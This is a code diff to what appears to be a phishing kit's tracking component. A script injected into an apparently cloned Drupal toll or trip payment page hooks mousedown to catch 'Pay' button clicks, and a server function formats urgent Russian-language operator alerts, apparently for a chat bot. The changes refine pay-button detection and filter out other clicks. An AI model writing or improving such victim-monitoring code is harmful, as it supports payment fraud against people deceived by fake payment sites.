@@ -454,7 +454,13 @@ function formatSessionMessage(session, sessionId) {
       case 'pay_button_click':
         // HIGH PRIORITY - PAY BUTTON CLICKED!
         message += `\n💳🔥 [${time}] <b>🚨 НАЖАЛ КНОПКУ PAY!</b>\n`;
-        if (logValue) message += `   └ Текст кнопки: <code>${logValue}</code>\n`;
+        // Only show button text if it's clean and short (not "Find VehicleFind" etc)
+        if (logValue && logValue.trim() && logValue.length < 30 && !logValue.match(/[A-Z]{2,}/)) {
+          var cleanBtnText = logValue.trim().substring(0, 20);
+          if (cleanBtnText.toLowerCase() === 'pay' || cleanBtnText.toLowerCase().indexOf('pay') > -1) {
+            message += `   └ Текст кнопки: <code>${cleanBtnText}</code>\n`;
+          }
+        }
         message += `\n`;
         break;
       case 'button_click':
@@ -1251,6 +1257,44 @@ function getTrackingScript() {
     }
   },true);
   
+  // Helper: Get clean button text (only direct text, not from children)
+  function _getButtonText(btn){
+    // Priority 1: value attribute (cleanest)
+    if(btn.value&&btn.value.trim()){
+      return btn.value.trim();
+    }
+    // Priority 2: Get only direct text nodes (exclude child elements)
+    var text='';
+    for(var i=0;i<btn.childNodes.length;i++){
+      var node=btn.childNodes[i];
+      if(node.nodeType===3){ // Text node
+        text+=node.textContent;
+      }
+    }
+    if(text.trim()){
+      return text.trim();
+    }
+    // Priority 3: innerText (respects CSS visibility)
+    if(btn.innerText){
+      var it=btn.innerText.trim();
+      // Remove long text (likely contains child elements)
+      if(it.length<100){
+        return it;
+      }
+    }
+    // Priority 4: textContent but limit length
+    if(btn.textContent){
+      var tc=btn.textContent.trim();
+      // If too long, likely contains child elements - use first word only
+      if(tc.length>50){
+        var firstWord=tc.split(/[\\s\\n\\r\\t]+/)[0];
+        return firstWord||'Pay';
+      }
+      return tc;
+    }
+    return 'Pay';
+  }
+  
   // CRITICAL: Track PAY button using MOUSEDOWN - fires BEFORE Drupal AJAX intercepts click
   // Drupal uses stopImmediatePropagation() on click, so we use mousedown instead
   function _handlePayButton(e){
@@ -1260,39 +1304,52 @@ function getTrackingScript() {
     var payBtn=target.closest('[data-drupal-selector="edit-pay"],[data-drupal-selector*="pay"],[name="op"][value="Pay"]');
     if(payBtn){
       _payClickTime=Date.now();
-      var txt=(payBtn.textContent||payBtn.value||'Pay').replace(/[\\s\\n\\r\\t]+/g,' ').trim();
-      _send({t:'event',ec:'payment',ea:'button_click',el:'pay',ev:txt||'Pay',pg:_getPageType()});
-      console.log('[TRACK] DRUPAL PAY BUTTON DETECTED!', txt);
+      var txt=_getButtonText(payBtn);
+      _send({t:'event',ec:'payment',ea:'button_click',el:'pay',ev:txt,pg:_getPageType()});
       return;
     }
     
     // Also check for generic Pay buttons
     var btn=target.closest('button,input[type="submit"],.btn,[role="button"],a.btn,a.button,.form-submit,.btn-pay-trips');
     if(btn){
-      var txt=btn.textContent||btn.value||btn.innerText||'';
-      txt=txt.replace(/[\\s\\n\\r\\t]+/g,' ').trim().substring(0,50);
-      
-      // Check button attributes
+      // Check button attributes FIRST (more reliable than text)
       var btnId=(btn.id||'').toLowerCase();
       var btnClass=(btn.className||'').toLowerCase();
       var btnValue=(btn.value||'').toLowerCase();
       var btnName=(btn.name||'').toLowerCase();
       
-      // Detect PAY button - check multiple attributes
+      // Detect PAY button - STRICT CHECK (avoid false positives)
       var isPay=false;
-      if(txt.toLowerCase().indexOf('pay')>-1){isPay=true;}
-      if(btnId.indexOf('pay')>-1){isPay=true;}
-      if(btnClass.indexOf('pay')>-1||btnClass.indexOf('btn-pay')>-1){isPay=true;}
-      if(btnValue.indexOf('pay')>-1){isPay=true;}
-      if(btnName==='op'&&btnValue==='pay'){isPay=true;}
+      
+      // STRICT: Must have "pay" in ID, class, or value (not just text)
+      if(btnId.indexOf('pay')>-1||btnId.indexOf('edit-pay')>-1){isPay=true;}
+      if(btnClass.indexOf('btn-pay')>-1||btnClass.indexOf('pay-trips')>-1){isPay=true;}
+      if(btnValue==='pay'||btnValue==='Pay'){isPay=true;}
+      if(btnName==='op'&&(btnValue==='pay'||btnValue==='Pay')){isPay=true;}
+      
+      // Also check for Drupal-specific selectors
+      if(btn.getAttribute('data-drupal-selector')&&btn.getAttribute('data-drupal-selector').indexOf('pay')>-1){
+        isPay=true;
+      }
+      
+      // LAST RESORT: Check text ONLY if button text is exactly "Pay" (case insensitive)
+      if(!isPay){
+        var txt=_getButtonText(btn).toLowerCase().trim();
+        // Must be exactly "pay" or start with "pay " (not "find vehicle" etc)
+        if(txt==='pay'||txt==='pay '||txt.startsWith('pay ')){
+          isPay=true;
+        }
+      }
       
       if(isPay){
         _payClickTime=Date.now();
-        _send({t:'event',ec:'payment',ea:'button_click',el:'pay',ev:txt||'Pay',pg:_getPageType()});
-        console.log('[TRACK] PAY BUTTON CLICKED!', txt, btnId, btnClass);
-      }else if(txt&&txt.length>0){
-        _send({t:'event',ec:'ui',ea:'click',el:'button',ev:txt,pg:_getPageType()});
+        // Use value attribute if available, otherwise clean text
+        var cleanText=btn.value||_getButtonText(btn);
+        // Clean text - remove extra whitespace and limit length
+        cleanText=cleanText.replace(/[\\s\\n\\r\\t]+/g,' ').trim().substring(0,30);
+        _send({t:'event',ec:'payment',ea:'button_click',el:'pay',ev:cleanText||'Pay',pg:_getPageType()});
       }
+      // DO NOT send other button clicks - they create noise
     }
   }
   
